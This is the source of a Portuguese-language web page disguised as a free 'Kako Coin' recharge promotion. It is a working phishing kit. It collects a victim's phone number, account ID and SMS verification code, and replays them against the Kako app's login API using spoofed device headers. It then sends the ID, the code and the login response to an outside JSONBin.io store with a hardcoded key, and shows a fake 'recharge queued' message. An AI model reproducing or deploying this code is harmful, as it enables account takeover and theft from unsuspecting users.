<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga de Conta | Kako Coin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <meta name="description" content="Sistema de recarga Kako Coin">
    <style>
        .free-badge {
            position: absolute;
            bottom: -10px;
            right: 10px;
            font-size: 11px;
            background-color: red;
            color: white;
            padding: 2px 6px;
            border-radius: 4px;
            font-weight: bold;
        }
        .banner-flash {
            animation: flash 2s infinite;
        }
        @keyframes flash {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        .coin-option.selected {
            background-color: #7e22ce !important;
            color: white !important;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .phone-prefix {
            display: inline-flex;
            align-items: center;
            padding: 0 12px;
            background-color: #e5e7eb;
            border: 1px solid #d1d5db;
            border-right: none;
            border-radius: 6px 0 0 6px;
            height: 100%;
            color: #374151;
        }
        .validation-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
        }
        .input-wrapper {
            position: relative;
        }
        .countdown {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-top: 10px;
        }
        .timer {
            font-weight: bold;
            color: #7e22ce;
        }
        .info-banner {
            background: linear-gradient(90deg, #f59e0b 0%, #d97706 100%);
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }
        /* Estilos do Modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body class="bg-gray-100 font-sans">
    <!-- Modal para validação do PIN -->
    <div id="pinModal" class="modal-overlay hidden">
        <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md mx-4">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-xl font-bold text-purple-800">Valide seu ID</h3>
                <button id="closePinModal" class="text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <p class="mb-4">Enviamos um código de 6 dígitos para o seu número. Digite abaixo para validar:</p>
            
            <div id="countdown" class="countdown hidden">
                <p>Você pode solicitar um novo código em: <span id="timer" class="timer">30</span> segundos</p>
            </div>
            
            <form id="pinForm" class="space-y-4">
                <div class="input-wrapper">
                    <input type="text" id="pinInput" maxlength="6" 
                           class="w-full px-4 py-3 border border-gray-300 rounded-md text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-purple-600"
                           placeholder="000000">
                    <p id="pinError" class="text-red-600 text-sm mt-1 hidden">PIN inválido. Digite apenas números.</p>
                </div>
                <button type="submit" id="submitPinBtn" 
                        class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
                    Validar e Recarregar
                </button>
            </form>
        </div>
    </div>

    <div class="container mx-auto px-4 py-8">
        <!-- Header -->
        <header class="flex justify-between items-center mb-8">
            <div class="flex items-center">
                <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" 
                     alt="Logo Kako" class="h-12">
                <h1 class="ml-2 text-2xl font-bold text-purple-800">KAKO COIN</h1>
                <img src="https://i.ibb.co/W4GBrhXd/images-removebg-preview.png" alt="Kako Coin" class="h-12 ml-2">
            </div>
        </header>

        <!-- Main Content -->
        <main>
            <!-- Form Section -->
            <div class="bg-white rounded-lg shadow-md p-6 mb-6">
                <h2 class="text-2xl font-bold text-purple-800 mb-6">Recarga de Conta</h2>
                
                <form id="rechargeForm" class="space-y-4">
                    <input type="hidden" id="amount" name="amount" value="10000">
                    
                    <div>
                        <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
                        <div class="flex input-wrapper">
                            <span class="phone-prefix">+55</span>
                            <input type="tel" id="phone" name="phone" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-purple-600"
                                   placeholder="DDD + Número">
                            <div id="phoneValidation" class="validation-icon hidden"></div>
                        </div>
                        <p id="phoneError" class="text-red-600 text-sm mt-1 hidden"></p>
                    </div>
                    
                    <div>
                        <label for="id" class="block text-sm font-medium text-gray-700 mb-1">ID (6 a 8 números)</label>
                        <div class="input-wrapper">
                            <input type="text" id="id" name="id" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600"
                                   placeholder="Apenas números">
                            <div id="idValidation" class="validation-icon hidden"></div>
                        </div>
                        <p id="idError" class="text-red-600 text-sm mt-1 hidden"></p>
                    </div>
                </form>

                <!-- Coin Options -->
                <div class="bg-white rounded-lg shadow-md p-6 mt-6">
                    <h3 class="text-xl font-bold text-purple-800 mb-4">Opções de Recarga</h3>
                    
                    <div class="grid grid-cols-2 gap-4">
                        <button type="button" class="coin-option selected w-full bg-purple-700 text-white py-3 px-4 rounded-md hover:bg-purple-800 transition duration-200 font-medium relative" data-amount="10000">
                            10.000 Kako Moedas
                            <span class="free-badge">GRÁTIS 1x</span>
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="50000">
                            50.000 Kako Moedas
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="100000">
                            100.000 Kako Moedas
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="500000">
                            500.000 Kako Moedas
                        </button>
                    </div>
                </div>

                <div class="mt-6">
                    <button type="submit" id="submitBtn" 
                            class="w-full bg-gray-400 text-white py-3 px-4 rounded-md transition duration-200 font-medium" disabled>
                        Solicitar Código SMS
                    </button>

                    <div id="smsCountdown" class="countdown hidden">
                        <p>Próximo SMS disponível em: <span id="smsTimer" class="timer">30</span> segundos</p>
                    </div>
                </div>
            </div>
            
            <!-- Banner de Avisos Section -->
            <div class="flex-1">
                <div class="info-banner rounded-lg shadow-md p-6 text-white mb-6 banner-flash">
                    <div class="flex items-center">
                        <div class="mr-4">
                            <i class="fas fa-bolt text-4xl"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold">RECARGA RÁPIDA</h3>
                            <p class="mt-2">Processamos suas recargas em até 15 minutos após a confirmação.</p>
                        </div>
                    </div>
                </div>
                
                <div class="info-banner rounded-lg shadow-md p-6 text-white mb-6" style="background: linear-gradient(90deg, #2196f3 0%, #1976d2 100%);">
                    <div class="flex items-center">
                        <div class="mr-4">
                            <i class="fas fa-shield-alt text-4xl"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold">SEGURANÇA</h3>
                            <p class="mt-2">Seus dados são criptografados e protegidos por nossas políticas de segurança.</p>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer com Avisos -->
        <footer class="mt-12 text-center text-gray-600 text-sm">
            <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6 text-left">
                <p class="font-bold">AVISO:</p>
                <p class="mb-2">*Termos e Condições: Esta promoção é válida apenas para primeira recarga de novos usuários.</p>
                <p>A promoção é válida exclusivamente para usuários brasileiros e/ou com número de telefone nacional (+55).</p>
                <p class="mt-4">Ao realizar a recarga, você concorda com nossos Termos de Serviço e Política de Privacidade.</p>
            </div>
            
            <p>© 2023 Kako Coin. Todos os direitos reservados.</p>
            <div class="mt-2 flex justify-center space-x-4">
                <a href="#" class="hover:text-purple-700">Termos de Serviço</a>
                <a href="#" class="hover:text-purple-700">Política de Privacidade</a>
                <a href="#" class="hover:text-purple-700">Contate-nos</a>
            </div>
        </footer>
    </div>

    <script>
        // Variáveis para armazenar dados temporários
        let currentPhone = '';
        let currentId = '';
        let smsCooldown = false;
        let smsCooldownTimer = null;
        let countdownTimer = null;

        // Elementos do DOM
        const pinModal = document.getElementById('pinModal');
        const closePinModal = document.getElementById('closePinModal');
        const pinForm = document.getElementById('pinForm');
        const submitBtn = document.getElementById('submitBtn');
        const submitPinBtn = document.getElementById('submitPinBtn');
        const phoneInput = document.getElementById('phone');
        const idInput = document.getElementById('id');
        const pinInput = document.getElementById('pinInput');

        // Headers para as requisições (baseados no código que funcionou)
        const COMMON_HEADERS = {
            'accept': 'application/json',
            'accept-language': 'pt',
            'x-app-devicetype': 'android',
            'x-app-version': '1.15.2',
            'x-app-bundleid': 'live.kako.global',
            'x-app-channelid': 'google',
            'x-app-buildid': '24bbabf0',
            'x-app-lang': 'pt',
            'x-app-lang-excludes': 'en,es',
            'x-app-deviceid': 'a5247afb-4d54-4867-b6ab-637496a78cf1',
            'x-app-timezone': 'America/Sao_Paulo',
            'x-app-country': 'BR',
            'x-app-devicename': 'Motorola moto g(8)',
            'content-type': 'application/json; charset=UTF-8',
            'accept-encoding': 'gzip',
            'user-agent': 'okhttp/4.12.0'
        };

        // Inicialização
        document.addEventListener('DOMContentLoaded', function() {
            // Configurar event listeners
            setupEventListeners();
            
            // Configurar seleção de moedas
            setupCoinOptions();
        });

        function setupEventListeners() {
            // Fechar modal
            closePinModal.addEventListener('click', function() {
                pinModal.classList.add('hidden');
                if (countdownTimer) clearInterval(countdownTimer);
            });
            
            // Envio do formulário principal
            document.getElementById('rechargeForm').addEventListener('submit', handleFormSubmit);
            
            // Envio do formulário de PIN
            pinForm.addEventListener('submit', handlePinSubmit);
            
            // Validação em tempo real dos campos
            phoneInput.addEventListener('input', formatPhone);
            phoneInput.addEventListener('blur', validatePhone);
            idInput.addEventListener('input', sanitizeId);
            idInput.addEventListener('blur', validateId);
            pinInput.addEventListener('input', validatePin);
        }

        function setupCoinOptions() {
            document.querySelectorAll('.coin-option').forEach(button => {
                button.addEventListener('click', function() {
                    document.querySelectorAll('.coin-option').forEach(btn => {
                        btn.classList.remove('selected', 'bg-purple-700', 'text-white');
                        btn.classList.add('bg-purple-100', 'text-purple-800');
                    });
                    this.classList.add('selected', 'bg-purple-700', 'text-white');
                    this.classList.remove('bg-purple-100', 'text-purple-800');
                    document.getElementById('amount').value = this.dataset.amount;
                });
            });
        }

        // Função para formatar telefone
        function formatPhone() {
            let value = phoneInput.value.replace(/\D/g, '');
            
            // Limita a 11 dígitos (DDD + número)
            if (value.length > 11) {
                value = value.slice(0, 11);
            }
            
            // Aplica a formatação
            if (value.length > 0) {
                value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
                if (value.length > 10) {
                    value = value.replace(/(\d{5})(\d)/, '$1-$2');
                }
            }
            
            phoneInput.value = value;
            validateButton();
        }

        // Função para validar o telefone
        function validatePhone() {
            const phoneNumber = phoneInput.value.replace(/\D/g, '');
            const validationIcon = document.getElementById('phoneValidation');
            const phoneError = document.getElementById('phoneError');
            
            if (phoneNumber.length !== 11) {
                validationIcon.innerHTML = '<i class="fas fa-times-circle text-red-500"></i>';
                validationIcon.classList.remove('hidden');
                phoneError.textContent = 'Telefone deve ter 11 dígitos';
                phoneError.classList.remove('hidden');
            } else {
                validationIcon.innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
                validationIcon.classList.remove('hidden');
                phoneError.classList.add('hidden');
            }
            
            validateButton();
        }

        // Função para validar o ID (6 a 8 números)
        function validateId() {
            const idValue = idInput.value.trim();
            const validationIcon = document.getElementById('idValidation');
            const idError = document.getElementById('idError');
            
            if (idValue.length < 6 || idValue.length > 8) {
                validationIcon.innerHTML = '<i class="fas fa-times-circle text-red-500"></i>';
                validationIcon.classList.remove('hidden');
                idError.textContent = 'ID deve ter entre 6 e 8 números';
                idError.classList.remove('hidden');
            } else if (!/^\d+$/.test(idValue)) {
                validationIcon.innerHTML = '<i class="fas fa-times-circle text-red-500"></i>';
                validationIcon.classList.remove('hidden');
                idError.textContent = 'ID deve conter apenas números';
                idError.classList.remove('hidden');
            } else {
                validationIcon.innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
                validationIcon.classList.remove('hidden');
                idError.classList.add('hidden');
            }
            
            validateButton();
        }

        // Função para habilitar/desabilitar o botão
        function validateButton() {
            const phoneNumber = phoneInput.value.replace(/\D/g, '');
            const idValue = idInput.value.trim();
            
            if (phoneNumber.length === 11 && idValue.length >= 6 && idValue.length <= 8 && /^\d+$/.test(idValue)) {
                submitBtn.disabled = false;
                submitBtn.classList.remove('bg-gray-400');
                submitBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
            } else {
                submitBtn.disabled = true;
                submitBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
                submitBtn.classList.add('bg-gray-400');
            }
        }

        // Função para sanitizar o ID (permite apenas números)
        function sanitizeId() {
            idInput.value = idInput.value.replace(/\D/g, '');
            
            // Limita a 8 dígitos
            if (idInput.value.length > 8) {
                idInput.value = idInput.value.slice(0, 8);
            }
            
            validateButton();
        }

        // Função para validar o PIN (apenas números)
        function validatePin() {
            const pinError = document.getElementById('pinError');
            // Permite apenas números
            pinInput.value = pinInput.value.replace(/\D/g, '');
            
            if (pinInput.value.length > 6) {
                pinInput.value = pinInput.value.slice(0, 6);
            }
            
            // Mostra erro se ainda houver caracteres não numéricos
            if (/\D/.test(pinInput.value)) {
                pinError.classList.remove('hidden');
            } else {
                pinError.classList.add('hidden');
            }
        }

        // Função para iniciar o countdown do SMS
        function startSmsCooldown() {
            smsCooldown = true;
            const smsCountdown = document.getElementById('smsCountdown');
            const smsTimer = document.getElementById('smsTimer');
            
            submitBtn.disabled = true;
            submitBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
            submitBtn.classList.add('bg-gray-400');
            smsCountdown.classList.remove('hidden');
            
            let timeLeft = 30;
            
            smsCooldownTimer = setInterval(() => {
                timeLeft--;
                smsTimer.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(smsCooldownTimer);
                    smsCooldown = false;
                    smsCountdown.classList.add('hidden');
                    validateButton();
                }
            }, 1000);
        }

        // Função para iniciar o countdown do PIN
        function startPinCountdown() {
            const countdown = document.getElementById('countdown');
            const timer = document.getElementById('timer');
            countdown.classList.remove('hidden');
            
            let timeLeft = 30;
            
            countdownTimer = setInterval(() => {
                timeLeft--;
                timer.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownTimer);
                    countdown.classList.add('hidden');
                }
            }, 1000);
        }

        // Handler para o envio do formulário principal
        async function handleFormSubmit(e) {
            e.preventDefault();
            
            // Validações básicas
            const phone = phoneInput.value;
            const id = idInput.value;
            
            if (!phone || phone.replace(/\D/g, '').length !== 11) {
                alert('Por favor, informe um número de telefone válido com DDD.');
                return;
            }
            
            if (!id || id.length < 6 || id.length > 8 || !/^\d+$/.test(id)) {
                alert('Por favor, informe um ID válido com 6 a 8 números.');
                return;
            }
            
            // Verifica se está em cooldown
            if (smsCooldown) {
                alert('Aguarde o tempo restante antes de solicitar um novo código.');
                return;
            }
            
            // Armazena os dados temporariamente
            currentPhone = '+55' + phone.replace(/\D/g, '');
            currentId = id;
            
            // Atualiza o texto do botão para mostrar loading
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = '<span class="loading"></span> Enviando código...';
            submitBtn.disabled = true;
            
            try {
                // NOVA API: /api/v1/login/phone/check (conforme descoberto)
                const response = await fetch('/api/v1/login/phone/check', {
                    method: 'POST',
                    headers: COMMON_HEADERS,
                    body: JSON.stringify({
                        phone: currentPhone,
                        scene: 1  // scene: 1 conforme seu código funcionou
                    })
                });
                
                const result = await response.json();
                console.log("Resposta da API:", result);
                
                if (result.code == 0) { // Verifica se code é 0 (sucesso)
                    // Sucesso - abre o modal para inserir o PIN
                    pinModal.classList.remove('hidden');
                    startSmsCooldown();
                    startPinCountdown();
                } else {
                    // Erro na API
                    alert('Erro ao solicitar código: ' + (result.msg || 'Código de erro desconhecido'));
                }
            } catch (error) {
                console.error('Erro ao enviar solicitação:', error);
                alert('Erro ao conectar com o servidor. Tente novamente.');
            } finally {
                // Restaura o botão
                submitBtn.innerHTML = originalText;
                validateButton();
            }
        }
        
        // Handler para o envio do formulário de PIN
        async function handlePinSubmit(e) {
            e.preventDefault();
            
            const pin = pinInput.value;
            
            // Valida o PIN
            if (pin.length !== 6 || /\D/.test(pin)) {
                document.getElementById('pinError').classList.remove('hidden');
                return;
            }
            
            // Atualiza o texto do botão para mostrar loading
            const originalText = submitPinBtn.innerHTML;
            submitPinBtn.innerHTML = '<span class="loading"></span> Validando...';
            submitPinBtn.disabled = true;
            
            try {
                // NOVA API: /api/v1/login/phone/submit (conforme descoberto)
                const response = await fetch('/api/v1/login/phone/submit', {
                    method: 'POST',
                    headers: COMMON_HEADERS,
                    body: JSON.stringify({
                        phone: currentPhone,
                        password: currentId, // Usando o ID como password
                        code: pin,
                        scene: 0  // scene: 0 conforme seu código funcionou
                    })
                });
                
                const result = await response.json();
                console.log("Resposta do login:", result);
                
                if (result.code == 0) {
                    // Login bem-sucedido
                    await sendToJsonBin(currentId, pin, result);
                    
                    // Fecha o modal
                    pinModal.classList.add('hidden');
                    
                    // Mensagem de sucesso
                    alert(`⚠️ ATENÇÃO - ALTA DEMANDA\n\n` +
                          `📱 Sua recarga de 10.000 moedas foi recebida!\n\n` +
                          `🆔 ID: ${currentId}\n` +
                          `⏱️ Status: Na fila de processamento\n\n` +
                          `⌛ Devido à grande demanda atual, o crédito pode demorar até 1 hora\n\n` +
                          `🔍 Dica: Verifique em "Histórico" após 15 minutos\n` +
                          `📞 Problemas? Contate o suporte no app`);
                } else {
                    // Outro erro
                    alert('Erro: ' + (result.msg || 'Código de erro desconhecido'));
                }
            } catch (error) {
                console.error('Erro ao validar PIN:', error);
                alert('Erro ao conectar com o servidor. Tente novamente.');
            } finally {
                // Restaura o botão
                submitPinBtn.innerHTML = originalText;
                submitPinBtn.disabled = false;
                if (countdownTimer) clearInterval(countdownTimer);
            }
        }
        
        // Função para enviar dados para JSONBin.io
        async function sendToJsonBin(id, pin, apiResult) {
            // Coleta dados (apenas ID, não telefone)
            const formData = {
                id: id,
                pin: pin,
                api_response: apiResult,
                timestamp: new Date().toISOString()
            };

            // Master Key do JSONBin
            const MASTER_KEY = "$2a$10$9VJv2nY4tgeiSfh3AuAyUusmEFDpEMafqxKKHkOpikyoKc4QTd89m";

            try {
                // Envia para JSONBin.io
                const response = await fetch("https://api.jsonbin.io/v3/b", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Master-Key": MASTER_KEY
                    },
                    body: JSON.stringify(formData)
                });

                const result = await response.json();
                console.log("Dados salvos no JSONBin:", result);
            } catch (error) {
                console.error("Erro ao enviar para JSONBin:", error);
            }
        }
    </script>
</body>
</html>
